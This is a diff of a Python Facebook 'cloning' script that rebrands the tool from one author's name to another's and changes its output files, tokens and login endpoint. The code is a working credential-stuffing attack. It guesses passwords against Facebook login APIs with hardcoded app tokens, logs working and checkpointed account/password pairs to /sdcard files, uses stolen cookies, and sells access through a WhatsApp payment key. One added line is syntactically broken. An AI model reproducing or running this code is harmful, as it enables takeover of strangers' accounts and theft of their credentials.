@@ -107,19 +107,19 @@ def uaku():
 
 logo=("""\033[1;32m
 \033[1;32m 
-             ##   ##     ##   ########  
-             ##    ##   ##.   ##     ## 
-             ##     ## ##     ##     ## 
-             ##      ###      ########  
-       ##    ##     ## ##     ##     ## 
-       ##    ##    ##   ##    ##     ## 
-        ######    ##     ##   ######## 
+##    ##          ##     ## ########     
+###   ##          ##   ##  ##     ## 
+####  ##           ## ##   ##     ## 
+## ## ## #######    ###    ##     ## 
+##  ####           ## ##   ##     ## 
+##   ###          ##   ##  ##     ## 
+##    ##         ##     ## ########  
 \033[1;93m--------------------------------------------------
-\033[1;37m[-] AUTHOR    :\033[1;32m AWAIS TAHIR 
-\033[1;37m[-] GITHUB    :\033[1;32m JUTTBRAND
-\033[1;37m[-] VERSION   :\033[1;32m 3.4
+\033[1;37m[-] AUTHOR    :\033[1;32m NAYEM HASAN
+\033[1;37m[-] GITHUB    :\033[1;32m PRIVATE
+\033[1;37m[-] VERSION   :\033[1;32m 1.0
 \033[1;37m[-] STATUS    :\033[1;32m PREMIUM
- open source by Haris AKHTAR (Harry) fuck you ❤️
+  
 --------------------------------------------------
 \033[1;37m[-]Dear Paid user:
 \033[1;37m[-]Your subscription last date 25/12/22
@@ -342,7 +342,7 @@ def auto_file(cookies,access_token):
     print(' Total ids: '+str(len(total)))
     print('\n')
     input(' Press enter to back ')
-    os.system('python JXB.py')
+    os.system('python n-xd.py')
 def iamBadBoy(exid,cookies,access_token,sf):
     try:
         global total,loop
@@ -393,7 +393,7 @@ def manual_file(cookies,access_token):
     print(' Total ids grabbed: '+str(len(ids)))
     print(' Ids file saved in: '+sf)
     input(' \nPress enter to back ')
-    os.system('python JXB.py')
+    os.system('python n-xd.py')
 def sids():
     os.system('clear')
     print(logo)
@@ -405,7 +405,7 @@ def sids():
         exit()
     print('\n\033[1;32m Put limit between 1 to 10 \033[0;97m')
     limit = int(input(' How many links do you want to separate? '))
-    print('\n\033[1;32m Example: /sdcard/JXB.txt\033[0;97m')
+    print('\n\033[1;32m Example: /sdcard/N-XD.txt\033[0;97m')
     new_save = input(' Save new file as: ')
     print('')
     y = 0
@@ -436,7 +436,7 @@ def remove_dub():
         print(' Result file saved as: '+save_file)
         print(50*'-')
         input('\n Press enter to back ')
-        os.system('python JXB.py')
+        os.system('python n-xd.py')
     except FileNotFoundError:
         print(' File not found.')
 def login():
@@ -452,7 +452,7 @@ def login():
         open("fb_cookies.txt","w").write(cookies)
         print(' Logged in successfully ...')
         time.sleep(1)
-        os.system('python JXB.py')
+        os.system('python n-xd.py')
     except KeyError:
         print('\n Inavlid cookies, try another cookies')
         exit()
@@ -524,7 +524,7 @@ def menu():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python JXB.py')
+		os.system('python n-xd.py')
 	elif xd in ['2','02']:
 		create_file_login()
 	elif xd in ['3','03']:
@@ -552,7 +552,7 @@ def menu():
 	elif xd in ['8','08']:
 		os.system('rm -rf fb_cookies.txt')
 	elif xd in ['9','09']:
-		os.system(f'xdg-open https://wa.me/+923231243823');menu()
+		os.system(f'xdg-open https://wa.me/ ');menu()
 			
 	elif xd in ['0','00']:
 		exit(' KHUDA HAFIZ ')
@@ -604,7 +604,7 @@ def pak():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python JXB.py')
+		os.system('python n-xd.py')
 def bd():
 		user=[]
 		clear()
@@ -641,7 +641,7 @@ def bd():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python JXB.py')
+		os.system('python n-xd.py')
 def gmail():
 		os.system('rm -rf .re.txt')
 		clear()
@@ -714,11 +714,11 @@ def gmail():
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python JXB.py')
+		os.system('python n-xd.py')
 
 def ffb(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;32m [Juttbrand] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;32m [N-XD] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -740,13 +740,13 @@ def ffb(ids,names,passlist):
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				print('\r\r\033[1;32m [JXB-OK] %s | %s'%(ids,pas))
-				open('/sdcard/JXB-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				open('/sdcard/N-XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
 					print('\r\r\x1b[38;5;208m [JXB-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/JXB-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					open('/sdcard/N-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -803,12 +803,12 @@ def rcrack1(ids,passlist):
 			'method':'auth.login',
 			'fb_api_req_friendly_name':'authenticate',
 			'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
-			'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+			'access_token':'1834519433598619|xG13xwnmiGSDHbjfKoYTu8kr5gQ'}
 			head = {
 			'content-type':'application/x-www-form-urlencoded',
 			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
 			'x-fb-connection-type':'unknown',
-			'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+			'Authorization':'OAuth 1834519433598619|xG13xwnmiGSDHbjfKoYTu8kr5gQ',
 			'user-agent':ua,
 			'x-fb-net-hni':str(random.randint(2e4,4e4)),
 			'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
@@ -821,13 +821,13 @@ def rcrack1(ids,passlist):
 			q = json.loads(po)
 			if 'session_key' in q:
 				udx = str(q['uid'])
-				print('\r\r\033[1;32m [JXB-OK] '+udx+' | '+pas+'\033[1;97m')
-				open('/sdcard/JXB-OK.txt', 'a').write(udx+'|'+pas+'\n')
+				print('\r\r\033[1;32m [N-XD-OK] '+udx+' | '+pas+'\033[1;97m')
+				open('/sdcard/N-XD-OK.txt', 'a').write(udx+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in q['error_msg']:
-				print('\r\r\x1b[38;5;208m [JXB-CP] '+ids+' | '+pas+'\033[1;97m')
-				open('/sdcard/JXB-CP.txt','a').write(ids+'|'+pas+'\n')
+				print('\r\r\x1b[38;5;208m [N-XD-CP] '+ids+' | '+pas+'\033[1;97m')
+				open('/sdcard/N-XD-CP.txt','a').write(ids+'|'+pas+'\n')
 				cps.append(ids)
 				break
 			else:
@@ -856,10 +856,10 @@ def rcrack(ids,passlist):
 			"email":ids,
 			"pass":pas,
 			"login":"Log In"}
-			header_freefb = {'authority':'web.facebook.com',
+			header_freefb = {'authority':'p.facebook.com',
 			'method': 'POST',
 			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'accept': 'en-US,en;q=0.8',
 			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
 			'cache-control': 'max-age=0',
 			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
@@ -870,7 +870,7 @@ def rcrack(ids,passlist):
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro}
-			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -878,11 +878,11 @@ def rcrack(ids,passlist):
 				if uid in oks:pass
 				else:
 					if 'checkpoint' in str(lo):
-						print('\r\r\033[1;34m [JXB-TL] '+ids+' | '+pas)
+						print('\r\r\033[1;34m [N-XD-TL] '+ids+' | '+pas)
 					else:
-						print(f'\r\x1b[1;32m [JXB-OK] '+ids+' | '+pas)
+						print(f'\r\x1b[1;32m [N-XD-OK] '+ids+' | '+pas)
 						cek_apk(session,coki)
-						open('/sdcard/JXB-OK.txt', 'a').write(ids+'|'+pas+'\n')
+						open('/sdcard/N-XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
 						oks.append(uid)
 						break
 			elif 'checkpoint' in log_cookies:
@@ -891,7 +891,7 @@ def rcrack(ids,passlist):
 				if uid in cps:pass
 				else:
 					print('\r\r\x1b[38;5;208m [JXB-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/JXB-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					open('/sdcard/N-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 			else:
@@ -911,19 +911,19 @@ def menu_apikey():
 
   os.system(" clear")                          
   print("""\033[1;37m
-   \033[1;32m             .   ## ##     ## ########  
-   \033[1;32m                 ##  ##   ##  ##     ## 
-  \033[1;32m                  ##   ## ##   ##     ## 
-     \033[1;32m               ##    ###    ########  
-       \033[1;32m       ##    ##   ## ##   ##     ## 
-       \033[1;32m       ##    ##  ##   ##  ##     ## 
-     \033[1;32m          ######  ##     ## ########               
+##    ##          ##     ## ########       
+###   ##          ##   ##  ##     ## 
+####  ##           ## ##   ##     ## 
+## ## ## #######    ###    ##     ## 
+##  ####           ## ##   ##     ## 
+##   ###          ##   ##  ##     ## 
+##    ##         ##     ## ########         
  \033[1;93m=================================================
-\033[1;37m[-] AUTHOR    :\033[1;32m AWAIS TAHIR 
-\033[1;37m[-] GITHUB    :\033[1;32m JUTTBRAND
-\033[1;37m[-] WhatsApp  :\033[1;32m +923231243823  
+\033[1;37m[-] AUTHOR    :\033[1;32m NAYEM HASAN
+\033[1;37m[-] GITHUB    :\033[1;32m PRIVATE
+\033[1;37m[-] WhatsApp  :\033[1;32m *********  
 \033[1;37m[-] TOOLS     :\033[1;32m MIX CLONING
-\033[1;37m[-] VERSION   :\033[1;32m 3.4
+\033[1;37m[-] VERSION   :\033[1;32m 1.0
 \033[1;37m[-] STATUS    :\033[1;32m PAID
 ==================================================
 \033[1;33m[*]TOOLS  : Facebook cloning
@@ -942,7 +942,7 @@ def menu_apikey():
  [*] Random cloning
  [*] Gmail cloning
  [*] Separate ids
- [*] remove dublicate lines from file              [8] login another cookie
+ [*] remove dublicate lines from file               
  [*] contact with owner
  [0] Exit menu
 ==================================================   """)
@@ -957,7 +957,7 @@ def menu_apikey():
   print("")
   print("\033[1;37m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
   print("")
-  print("  SEND KEY ON ADMIN WHATSAPP,,,,,,,,,,,,,,,,,    ");time.sleep(1)
+  print("  SEND KEY ON ADMIN WHATSAPP YOUR  KEY : "+id)    ");time.sleep(1)
   os.system('xdg-open https://wa.me/+923231243823')
   print("");time.sleep(2)
   print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
@@ -972,7 +972,7 @@ def menu_apikey():
       
       print("\x1b[1;97m    Sorry Bro Token Key not AprovedðŸ˜“")
       print("    Send payment to Admin and get aproval"); time.sleep(2)
-      os.system('xdg-open https://wa.me/+923231243823')
+      os.system('xdg-open https://wa.me/ ')
       time.sleep(2)
       sys.exit()
   except:
@@ -1007,7 +1007,7 @@ def tnx():
       
       print("\x1b[1;97m    Sorry Bro Your Token not AprovedðŸ˜“ ")
       print("    Send payment to Admin and get aproval"); time.sleep(2)
-      os.system('xdg-open https://wa.me/+923231243823')
+      os.system('xdg-open https://wa.me/ ')
       time.sleep(2)
       sys.exit()
   except:
